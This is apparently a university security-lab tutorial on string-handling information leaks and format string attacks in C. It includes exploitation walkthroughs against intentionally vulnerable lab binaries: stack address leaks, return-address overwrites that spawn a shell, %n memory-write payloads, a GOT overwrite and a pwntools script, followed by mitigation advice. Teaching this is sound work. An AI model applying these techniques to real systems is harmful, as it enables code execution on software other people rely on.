---
linkTitle: Information Leaks
type: docs
weight: 10
---

# Information Leaks

-----


## Introduction
-----
#### Objectives & Rationale 

This is a tutorial based lab. Throughout this lab you will learn about frequent errors that occur when handling strings. This tutorial is focused on the C language. Generally, OOP languages (like Java, C\#,C++) are using classes to represent strings -- this simplifies the way strings are handled and decreases the frequency of programming errors.



#### What is a string?

Conceptually, a string is sequence of characters. The representation of a string can be done in multiple ways. One of the way is to represent a string as a contiguous memory buffer. Each character is **encoded** in a way. For example the **ASCII** encoding uses 7-bit integers to encode each character -- because it is more convenient to store 8-bits at a time in a byte, an ASCII character is stored in one byte.

The type for representing an ASCII character in C is `char` and it uses one byte. As a side note, `sizeof(char) == 1` is the only guarantee that the [C standard](http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf "http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf") gives.

Another encoding that can be used is Unicode (with UTF8, UTF16, UTF32 etc. as mappings). The idea is that in order to represent an Unicode string, **more than one** byte is needed for **one** character. `char16_t`, `char32_t` were introduced in the C standard to represent these strings. The C language also has another type, called `wchar_t`, which is implementation defined and should not be used to represent Unicode characters.

Our tutorial will focus on ASCII strings, where each character is represented in one byte. We will show a few examples of what happens when one calls *string manipulation functions* that are assuming a specific encoding of the string.


You will find extensive information on ASCII in the [ascii man page](http://man7.org/linux/man-pages/man7/ascii.7.html "http://man7.org/linux/man-pages/man7/ascii.7.html").

Inside an Unix terminal issue the command

``` {.code .bash}
man ascii
```


### Length management
-----------------


In C, the length of an ASCII string is given by its contents. An ASCII string ends with a `0` value byte called the `NUL` byte. Every `str*` function (i.e. a function with the name starting with `str`, such as `strcpy`, `strcat`, `strdup`, `strstr` etc.) uses this `0` byte to detect where the string ends. As a result, not ending strings in `0` and using `str*` functions leads to vulnerabilities.

### 1. Basic Info Leak (tutorial)


Enter the `01-basic-info-leak/` subfolder. It\'s a basic information leak example.

In `basic_info_leak.c`, `buf` is supplied as input, hence is not trusted. We should be careful with this buffer. If the user gives `32` bytes as input then `strcpy` will copy bytes in `my_string` until it finds a `NUL` byte (`0x00`). Because the [stack grows down](/courses/cns/labs/lab-05 "cns:labs:lab-05"), on most
platforms, we will start accessing the content of the stack. After the `buf` variable the stack stores the `old rbp`, the function return address and then the function parameters. This information is copied into `my_string`. As such, printing information in `my_string` (after byte index `32`) using `puts()` results in information leaks.

We can test this using:

``` {.code}
$ python -c 'print("A"*32)' | ./basic_info_leak 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�8�
```

In order to check the hexadecimal values of the leak, we pipe the output
through `xxd`:

``` {.code}
$ python -c 'print("A"*32)' | ./basic_info_leak | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: d066 57b4 fc7f 0a                        .fW....
```

We have leaked one value above:

the lower non-0 bytes of the old/stored `rbp` value (right after the buffer): `0x7ffcb45766d0` (it\'s a little endian architecture); it will differ on your system

The return address usually doesn\'t change (except for executables with PIE, *Position Independent Executable* support). But assuming ASLR is enabled, the `rbp` value changes at each run. If we leak it we have a basic address that we can toy around to leak or overwrite other values. We\'ll see more of that in the [Information Leak](#p_information_leak "cns:labs:lab-07 ↵") task.


### 2. Information Leak 


We will now show how improper string handling will lead to information leaks from the memory. For this, please access the `02-info-leak/` subfolder. Please browse the `info-leak.c` source code file.

The snippet below is the relevant code snippet. The goal is to call the `my_evil_func()` function. One of the building blocks of exploiting a vulnerability is to see whether or not we have memory write. If you have memory writes, then getting code execution is a matter of getting things right. In this task we are assuming that we have memory write (i.e. we can write any value at any address). You can call the `my_evil_func()` function by overriding the return address of the `my_main()` function:

```
#define NAME_SZ 32
 
static void read_name(char *name)
{
    memset(name, 0, NAME_SZ);
    read(0, name, NAME_SZ);
    //name[NAME_SZ-1] = 0;
}
 
static void my_main(void)
{
    char name[NAME_SZ];
 
    read_name(name);
    printf("hello %s, what address to modify and with what value?\n", name);
    fflush(stdout);
    my_memory_write();
    printf("Returning from main!\n");
}
```

What catches our eye is that the `read()` function call in the `read_name()` function read **exactly** `32` bytes. If we provide it `32` bytes it won\'t be null-terminated and will result in an information leak when `printf()` is called in the `my_main()` function.


#### Exploiting the memory write using the info leak {#exploiting_the_memory_write_using_the_info_leak}


Let\'s first try to see how the program works:

```
$ python -c 'import sys; sys.stdout.write(10*"A")' | ./info_leak 
hello AAAAAAAAAA, what address to modify and with what value?
```

The binary wants an input from the user using the `read()` library call as we can see below:

```
$ python -c 'import sys; sys.stdout.write(10*"A")' | strace -e read ./info_leak
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\203\1\0004\0\0\0"..., 512) = 512
read(0, "AAAAAAAAAA", 32)               = 10
hello AAAAAAAAAA, what address to modify and with what value?
read(0, "", 4)                          = 0
+++ exited with 255 +++
```

The input is read using the `read()` system call. The first read expects 32 bytes. You can see already that there\'s another `read()` call. That one is the first `read()` call in the `my_memory_write()` function.

As noted above, if we use exactly `32` bytes for name we will end up with a non-null-terminated string, leading to an information leak. Let\'s see how that goes:

```
$ python -c 'import sys; sys.stdout.write(32*"A")' | ./info_leak
hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�)���, what address to modify and with what value?
 
$ python -c 'import sys; sys.stdout.write(32*"A")' | ./info_leak | xxd
00000000: 6865 6c6c 6f20 4141 4141 4141 4141 4141  hello AAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh
00000030: 6174 2061 6464 7265 7373 2074 6f20 6d6f  at address to mo
00000040: 6469 6679 2061 6e64 2077 6974 6820 7768  dify and with wh
00000050: 6174 2076 616c 7565 3f0a                 at value?.
```

We see we have an information leak. We leak one piece of data above: `0x7fffffffdcf0`. If we run multiple times we can see that the values for the first piece of information differs:

``` {.code .bash}
$ python -c 'import sys; sys.stdout.write(32*"A")' | ./info_leak | xxd | grep ','
00000020: 4141 4141 4141 f0dc ffff ff7f 2c20 7768  AAAAAA......, wh
```

The variable part is related to a stack address (it starts with `0x7f`); it varies because ASLR is enabled. We want to look more carefully using GDB and figure out what the variable value represents:

``` {.code .bash}
$ gdb -q ./info_leak
Reading symbols from ./info_leak...done.
gdb-peda$ b my_main
Breakpoint 1 at 0x400560
gdb-peda$ r < <(python -c 'import sys; sys.stdout.write(32*"A")')
Starting program: info_leak < <(python -c 'import sys; sys.stdout.write(32*"A")')
[...]
 
# Do next instructions until after the call to printf.
gdb-peda$ ni
....
 
gdb-peda$ x/12g name
0x7fffffffdc20: 0x4141414141414141  0x4141414141414141
0x7fffffffdc30: 0x4141414141414141  0x4141414141414141
0x7fffffffdc40: 0x00007fffffffdc50  0x00000000004007aa
gdb-peda$ x/2i 0x004007aa
   0x4007aa <main+9>:  mov    edi,0x4008bc
   0x4007af <main+14>: call   0x400550 <puts@plt>
gdb-peda$ pdis main
Dump of assembler code for function main:
   0x00000000004007a1 <+0>:    push   rbp
   0x00000000004007a2 <+1>:    mov    rbp,rsp
   0x00000000004007a5 <+4>:    call   0x400756 <my_main>
   0x00000000004007aa <+9>:    mov    edi,0x4008bc
   0x00000000004007af <+14>:   call   0x400550 <puts@plt>
   0x00000000004007b4 <+19>:   mov    eax,0x0
   0x00000000004007b9 <+24>:   pop    rbp
   0x00000000004007ba <+25>:   ret    
End of assembler dump.
gdb-peda$  
```

From the GDB above, we determine that, after our buffer, there is the stored `rbp` (i.e. old rbp).


In 32-bit program there would (usually) be 2 leaked values:

- The old `ebp`


- The return address of the function


This happens if the values of the old `ebp` and the return address don\'t have any `\x00` bytes.

in the 64-bit example we only get the old `rbp` because the 2 high bytes of the stack address are always `0` which causes the string to be terminated early.


When we leak the two values we are able to retrieve the stored `rbp` value. In the above run the value of `rbp` is `0x00007fffffffdc50`. We also see that the stored `rbp` value is stored at **address** `0x7fffffffdc40`, which is the address current `rbp`. We have the situation in the below diagram:

![](https://ocw.cs.pub.ro/courses/_media/cns/labs/info-leak-stack-64.png)

We marked the stored `rbp` value (i.e. the frame pointer for `main()`: `0x7fffffffdc50`) with the font color red in both places.

In short, if we leak the value of the stored `rbp` (i.e. the frame pointer for `main()`: `0x00007fffffffdc50`) we can determine the address of the current `rbp` (i.e. the frame pointer for `my_main()`: `0x7fffffffdc40`), by subtracting `16`. The address where the
`my_main()` return address is stored (`0x7fffffffdc48`) is computed by subtracting `8` from the leaked `rbp` value. By overwriting the value at this address we will force an arbitrary code execution and call `my_evil_func()`.

In order to write the return address of the `my_main()` function with the address of the `my_evil_func()` function, make use of the
conveniently (but not realistically) placed `my_memory_write()` function. The `my_memory_write()` allows the user to write arbitrary
values to arbitrary memory addresses.

Considering all of this, update the `TODO` lines of the `exploit.py` script to make it call the `my_evil_func()` function.


Same as above, use `nm` to determine address of the `my_evil_func()` function. When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in [the CNS public repository](/courses/cns/resources/repo "cns:resources:repo").



Use the above logic to determine the `old rbp` leak and then the address of the `my_main()` return address.



See [here](https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack "https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.unpack") examples of using the `unpack()` function.



In case of a successful exploit the program will spawn a shell in the `my_evil_func()` function, same as below:

``` {.code}
$ python exploit.py 
[!] Could not find executable 'info_leak' in $PATH, using './info_leak' instead
[+] Starting local process './info_leak': pid 6422
[*] old_rbp is 0x7fffffffdd40
[*] return address is located at is 0x7fffffffdd38
[*] Switching to interactive mode
Returning from main!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```



The rule of thumb is: **Always know your string length.**


#### Format String Attacks 
---------------------


We will now see how (im)proper use of `printf` may provide us with ways of extracting information or doing actual attacks.

Calling `printf` or some other string function that takes a format string as a parameter, directly with a string which is supplied by the user leads to a vulnerability called **format string attack**.

The definition of `printf`:

``` {.code .bash}
int printf(const char *format, ...);
```

Let\'s recap some of [useful formats](http://www.cplusplus.com/reference/cstdio/printf/ "http://www.cplusplus.com/reference/cstdio/printf/"):

- `%08x` -- prints a number in hex format, meaning takes a number from the stack and prints in hex format


- `%s` -- prints a string, meaning takes a pointer from the stack and prints the string from that address


- `%n` -- writes the number of bytes written so far to the address given as a parameter to the function (takes a pointer from the stack). This format is not widely used but it is in the C standard.


- `%x` and `%n` are enough to have memory read and write and hence, to successfully exploit a vulnerable program that calls printf (or other format string function) directly with a string controlled by the user.
:::

### Example 2

``` {.code .C}
printf(my_string);
```

The above snippet is a good example of why ignoring compile time warnings is dangerous. The given example is easily detected by a static checker.

Try to think about:

- The peculiarities of `printf` (variable number of arguments)


- Where `printf` stores its arguments (*hint*: on the stack)


- What happens when `my_string` is `"%x"`


- How matching between format strings (e.g. the one above) and arguments is enforced (*hint*: it\'s not) and what happens in general when the number of arguments doesn\'t match the number of format specifiers


- How we could use this to cause information leaks and arbitrary memory writes (*hint*: see the format specifiers at the beginning of the section)

:::

### Example 3

We would like to check some of the well known and not so-well known features of [the printf function](http://man7.org/linux/man-pages/man3/printf.3.html "http://man7.org/linux/man-pages/man3/printf.3.html").
Some of them may be used for information leaking and for attacks such as format string attacks.

Go into `printf-features/` subfolder and browse the `printf-features.c` file. Compile the executable file using:

``` {.code .bash}
make
```

and then run the resulting executable file using

``` {.code .bash}
./printf-features
```

Go through the `printf-features.c` file again and check how print, length and conversion specifiers are used by `printf`. We will make use of the `%n` feature that allows memory writes, a requirement for attacks.
:::

### Basic Format String Attack {#basic_format_string_attack .sectionedit11}

You will now do a basic format string attack using the `03-basic-format-string/` subfolder. The source code is in `basic_format_string.c` and the executable is in `basic_format_string`.

You need to use `%n` to overwrite the value of the `v` variable to `0x300`. You have to do three steps:

1.Determine the address of the `v` variable using `nm`.


2.Determine the `n`-th parameter of `printf()` that you can write to using `%n`. The `buffer` variable will have to be that parameter;  you will store the address of the `v` variable in the `buffer` variable.


3.Construct a format string that enables the attack; the number of characters processed by `printf()` until `%n` is matched will have to be `0x300`.


For the second step let\'s run the program multiple times and figure out where the `buffer` address starts. We fill `buffer` with the `aaaa` string and we expect to discover it using the `printf()` format specifiers.

``` {.code}
$  ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022897ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25

$ ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
x7fffffffdcc07fffffffdcc0116022917ffff7dd18d06c6c25786c6c25786c6c25786c6c25786c6c25786c6c25787fffffffdcc07fffffffdcc01f6022917ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a

$ ./basic_format_string 
AAAAAAAA
%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx
7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a4141414141414141
```

In the last run we get the `4141414141414141` representation of `AAAAAAAA`. That means that, if we replace the final `%lx` with `%n`, we will write at the address `0x4141414141414141` the number of characters processed so far:

``` {.code}
$ echo -n '7fffffffdcc07fffffffdcc01f6022997ffff7fd44c0786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c2540000a' | wc -c
162
```

We need that number to be `0x300`. You can fine tune the format string by using a construct such as `%32llx` to print a number on `32` characters instead of a maximum of `16` characters. See how much extra room you need and see if you reach `0x300` bytes.


The construct needn\'t use a multiple of `8` for length. You may use the `%32llx` or `%33llx` or `%42llx`. The numeric argument states the length of the print output.

After the plan is complete, write down the attack by filling the `TODO` lines in the `exploit.py` solution skeleton.


When sending your exploit to the remote server, adjust this address according to the binary running on the remote endpoint. The precompiled binary can be found in [the CNS public repository](/courses/cns/resources/repo "cns:resources:repo").


After you write 0x300 chars in v, you should obtain shell

``` {.code}
$ python exploit64.py 
[!] Could not find executable 'basic_format_string' in $PATH, using './basic_format_string' instead
[+] Starting local process './basic_format_string': pid 20785
[*] Switching to interactive mode
                                     7fffffffdcc0  7fffffffdcc01f60229b7ffff7dd18d03125786c6c393425786c6c25786c6c34786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25786c6c25a6e25
$ 
```


### Extra: Format String Attack {#extraformat_string_attack .sectionedit12}


Go to the `04-format-string/` subfolder. In this task you will be working with a **32-bit binary**.

The goal of this task is to call `my_evil_func` again. This task is also tutorial based.

``` {.code .C}
int
main(int argc, char *argv[])
{
    printf(argv[1]);
    printf("\nThis is the most useless and insecure program!\n");
    return 0;
}
```


#### Transform Format String Attack to a Memory Write {#transform_format_string_attack_to_a_memory_write}


Any string that represents a useful format (e.g. `%d`, `%x` etc.) can be used to discover the vulnerability.

``` {.code .bash}
$ ./format "%08x %08x %08x %08x"
00000000 f759d4d3 00000002 ffd59bd4
This is the most useless and insecure program!
```

The values starting with 0xf are very likely pointers. Again, we can use this vulnerability as a information leakage. But we want more.

Another useful format for us is `%m$` followed by any normal format selector. Which means that the `m`th parameter is used as an input for the following format. `%10$08x` will print the `10`th paramater with `%08x`. This allows us to do a precise access of the stack.

Example:

``` {.code .bash}
$ ./format "%08x %08x %08x %08x %1\$08x %2\$08x %3\$08x %4\$08x"
00000000 f760d4d3 00000002 ff9aca24 00000000 f760d4d3 00000002 ff9aca24
This is the most useless and insecure program!
```

Note the equivalence between formats.

Now, because we are able to select *any* higher address with this function and because the buffer is on the stack, sooner or later we will discover our own buffer.

``` {.code .bash}
$ ./format "$(python -c 'print("%08x\n" * 10000)')" 
```

Depending on your setup you should be able to view the hex
representation of the string "%08x\\n".

**Why do we need our own buffer?** Remember the `%n` format? It can be used to write at an address given as parameter. The idea is to give this address as parameter and achieve memory writing. We will see later how to control the value.

The next steps are done with ASLR disabled. In order to disable ASLR,
please run

``` {.code .bash}
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

By trial and error or by using GDB (breakpoint on `printf`) we can determine where the buffer starts

``` {.code .bash}
$ ./format "$(python -c 'import sys; sys.stdout.buffer.write(b"ABCD" + b"%08x\n   " * 0x300)')"  | grep -n 41 | head
10:   ffffc410
52:   ffffcc41
72:   ffffcf41
175:   44434241
```


Command line Python exploits tend to get very tedious and hard to read when the payload gets more complex. You can use the following reference pwntools script to write your exploit. The code is equivalent to the above one-liner.

``` {.code .python}
#!/usr/bin/env python3
 
from pwn import *
 
stack_items = 200
 
pad = b"ABCD"
val_fmt = b"%08x\n   "
# add a \n at the end for consistency with the command line run
fmt = pad + val_fmt * stack_items + b"\n"
 
io = process(["./format", fmt])
 
io.interactive()
```

Then call the `format` using:

``` {.code}
$ python exploit.py
```

One idea is to keep things in multiple of 4, like "%08x \\n". If you are looking at line `175` we have `44434241` which is the base 16 representation of `“ABCD”` (because it\'s little endian). Note, you can add as many format strings you want, the start of the buffer will be the same (more or less).

We can compress our buffer by specifying the position of the argument.

``` {.code .bash}
$ ./format $(python -c 'import sys; sys.stdout.buffer.write(b"ABCD" + b"AAAAAAAA" * 199 + b"%175$08x")')
ABCDAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAA44434241
This is the most useless and insecure program!
```


`b”AAAAAAAA” * 199` is added to maintain the length of the original string, otherwise the offset might change.


You can see that the last information is our b"ABCD" string printed with `%08x` this means that we know where our buffer is.


You need to enable core dumps in order to reproduce the steps below:

``` {.code}
$ ulimit -c unlimited
```

The steps below work an a given version of libc and a given system. It\'s why the instruction that causes the fault is

``` {.code}
mov %edx,(%eax)
```

or the equivalent in Intel syntax

``` {.code}
mov DWORD PTR [eax], edx
```

It may be different on your system, for example `edx` may be replaced by `esi`, cuch as

``` {.code}
mov DWORD PTR [eax], esi
```

Update the explanations below accordingly.

Remove any core files you may have generated before testing yourprogram:

``` {.code}
rm -f core
```

We can replace `%08x` with `%n` this should lead to segmentation fault.

``` {.code .bash}
$ ./format "$(python -c 'import sys; sys.stdout.buffer.write(b"ABCD" + b"AAAAAAAA" * 199 + b"%175$08n")')"
Segmentation fault (core dumped)
$ gdb ./format -c core
...
Core was generated by `./format BCDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xf7e5deff in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x08048468 in main (argc=2, argv=0xffffd2f4) at format.c:18
(gdb) x/i $eip
=> 0xf7e580a2 <vfprintf+17906>:    mov    %edx,(%eax)
(gdb) info registers $edx $eax
edx            0x202    1596
eax            0x44434241   1145258561
(gdb) quit
```

Bingo. We have memory write. The vulnerable code tried to write at the address `0x44434241` ("ABCD" little endian) the value 1596. The value 1596 is the amount of data wrote so far by `printf`(`“ABCD” + 199 * “AAAAAAAA”`).

Right now, our input string has 1605 bytes (1604 with a `\n` at the end). But we can further compress it, thus making the value that we write independent of the length of the input.

``` {.code .bash}
$ ./format "$(python -c 'import sys; sys.stdout.buffer.write("ABCD" + "A" * 1588 + "%99x" + "%126$08n")')"
Segmentation fault (core dumped)
$ gdb ./format -c core
(gdb) info registers $edx $eax
edx            0x261    1691
eax            0x44434241   1145258561
(gdb) quit
```

Here we managed to write 1691 (4+1588+99). Note we should keep the number of bytes before the format string the same. Which means that if we want to print with a padding of 100 (three digits) we should remove one `A`. You can try this by yourself.

**How far can we go?** Probably we can use any integer for specifying the number of bytes which are used for a format, but we don\'t need this; moreover specifying a very large padding is not always feasible, think what happens when printing with `snprintf`. 255 should be enough.

Remember, we want to write a value to a certain address. So far we control the address, but the value is somewhat limited. If we want to write 4 bytes at a time we can make use of the endianess of the machine. **The idea** is to write at the address n and then at the address n+1 and so on.

Lets first display the address. We are using the address `0x804c014`. This address is the address of the got entry for the puts function. Basically, we will override the got entry for the puts.

Check the `exploit.py` script from the task directory, read the commends and understand what it does.

``` {.code .bash}
$ python exploit.py
[*] 'format'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './format': pid 29030
[*] Switching to interactive mode
[*] Process './format' stopped with exit code 0 (pid 29030)
\x14\x04\x15\x04\x17\x04\x18\x04 804c014  804c015  804c017  804c018 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
This is the most useless and insecure program!
```

The output starts with `\x14\x04\x15\x04\x17\x04\x18\x04 804c014  804c015  804c017  804c018` which is the 4 addresses we have written (raw, little endian) followed by the numerical prints done with `%x` of the same addresses.

If you have the same output it means that now, if you replace `%x` with `%n` (change `fmt = write_fmt` in the script) it will try to write something at those valid addresses.

We want to put the value `0x080491a6`.

``` {.code .bash}
$ objdump -d ./format | grep my_evil
080491a6 <my_evil_func>:
```


As `%n` writes how many characters have been printed until it is reached, each `%n` will print an incrementally larger value. We use the 4 adjacent adressess to write byte by byte and use overflows to reach a lower value for the next byte. For example, after writing `0xa6` we can write `0x0191`:

![](https://ocw.cs.pub.ro/courses/_media/cns/labs/bytes_write.png)

Also, the `%n` count doesn\'t reset so, if we want to write `0xa6` and then `0x91` the payload should be in the form of:

`<0xa6 bytes>%n<0x100 - 0xa6 + 0x91 bytes>%n`

As mentioned earlier above, instead writing N bytes `“A” * N` you can use other format strings like `%Nc` or `%Nx` to keep the payload shorter.


Bonus task** Can you get a shell? (Assume ASLR is disabled).

#### Mitigation and Recommendations 
------------------------------


1. Manage the string length carefully


2. Don\'t use `gets`. With `gets` there is no way of knowing how much data was read


3. Use string functions with `n` parameter, whenever a non constant string is involved. i.e. `strnprintf`, `strncat`.


4. Make sure that the `NUL` byte is added, for instance `strncpy` does **not** add a `NUL` byte.


5. Use `wcstr*` functions when dealing with wide char strings.

6. Don\'t trust the user!


#### Real life Examples
------------------

- [Heartbleed](http://xkcd.com/1354/ "http://xkcd.com/1354/")
Linux kernel through 3.9.4 [CVE-2013-2851](http://www.cvedetails.com/cve/CVE-2013-2851/ "http://www.cvedetails.com/cve/CVE-2013-2851/"). The fix is [here](http://marc.info/?l=linux-kernel&m=137055204522556&w=2 "http://marc.info/?l=linux-kernel&m=137055204522556&w=2"). More details [here](http://www.intelligentexploit.com/view-details-ascii.html?id=16609 "http://www.intelligentexploit.com/view-details-ascii.html?id=16609").

- Windows 7 [CVE-2012-1851](http://www.cvedetails.com/cve/CVE-2012-1851/ "http://www.cvedetails.com/cve/CVE-2012-1851/").

-   Pidgin off the record plugin [CVE-2012-2369](http://www.cvedetails.com/cve/CVE-2012-2369 "http://www.cvedetails.com/cve/CVE-2012-2369"). The fix is [here](https://bugzilla.novell.com/show_bug.cgi?id=762498#c1 "https://bugzilla.novell.com/show_bug.cgi?id=762498#c1")

### Resources
---------
[Secure Coding in C and C++](http://www.cert.org/books/secure-coding/ "http://www.cert.org/books/secure-coding/")
[String representation in  C](http://www.informit.com/articles/article.aspx?p=2036582 "http://www.informit.com/articles/article.aspx?p=2036582")
[Improper string length checking](https://www.owasp.org/index.php/Improper_string_length_checking "https://www.owasp.org/index.php/Improper_string_length_checking")
[Format String definition](http://cwe.mitre.org/data/definitions/134.html "http://cwe.mitre.org/data/definitions/134.html")
[Format String Attack (OWASP)](https://www.owasp.org/index.php/Format_string_attack "https://www.owasp.org/index.php/Format_string_attack")
[Format String Attack (webappsec)](http://projects.webappsec.org/w/page/13246926/Format%20String "http://projects.webappsec.org/w/page/13246926/Format%20String")
[strlcpy and strlcat - consistent, safe, string copy and  concatenation.](http://www.gratisoft.us/todd/papers/strlcpy.html "http://www.gratisoft.us/todd/papers/strlcpy.html") - This resource is useful to understand some of the string manipulation problems.

------------------------------------------------------------------------

Except where otherwise noted, content on this page is licensed under the
following license: [CC Attribution-Share Alike 4.0 International](https://creativecommons.org/licenses/by-sa/4.0/deed.en)
